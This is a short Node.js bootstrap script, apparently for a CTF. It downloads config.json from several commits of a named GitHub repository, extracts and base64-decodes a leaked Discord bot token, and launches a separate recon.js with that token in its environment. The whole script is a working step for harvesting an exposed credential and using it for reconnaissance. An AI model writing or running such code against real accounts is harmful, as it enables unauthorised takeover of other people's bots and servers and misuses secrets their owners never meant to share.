#!/usr/bin/env node
// Bootstrap: fetch the leaked (already-public) Discord token from the CTF repo, decode, run recon.
const https = require('https');
const { exec } = require('child_process');

function get(url) {
  return new Promise((resolve) => {
    const r = https.get(url, { headers: { 'User-Agent': 'node' } }, (res) => {
      let d = ''; res.on('data', (c) => (d += c)); res.on('end', () => resolve(d));
    });
    r.on('error', () => resolve(''));
    r.setTimeout(20000, () => { r.destroy(); resolve(''); });
  });
}

(async () => {
  // Token is public in git history (commit df2e2d8). Fetch config.json + decode bot_token.
  const candidates = [
    'https://raw.githubusercontent.com/GPA50/Weather-Bot-CLI-2/df2e2d8/config.json',
    'https://raw.githubusercontent.com/GPA50/Weather-Bot-CLI/df2e2d8/config.json',
    'https://raw.githubusercontent.com/GPA50/Weather-Bot-CLI/master/config.json',
  ];
  let token = '';
  for (const u of candidates) {
    const cfg = await get(u);
    const m = cfg.match(/bot_token"\s*:\s*"([^"]+)"/);
    if (m) { token = Buffer.from(m[1], 'base64').toString('utf8').trim(); break; }
  }
  if (!token) { console.log('NO TOKEN FOUND in public repo'); process.exit(1); }
  console.log('token fetched, length', token.length);
  const p = exec('node recon.js', { env: { ...process.env, TOKEN: token } });
  p.stdout.pipe(process.stdout); p.stderr.pipe(process.stderr);
  p.on('exit', (c) => process.exit(c || 0));
})();
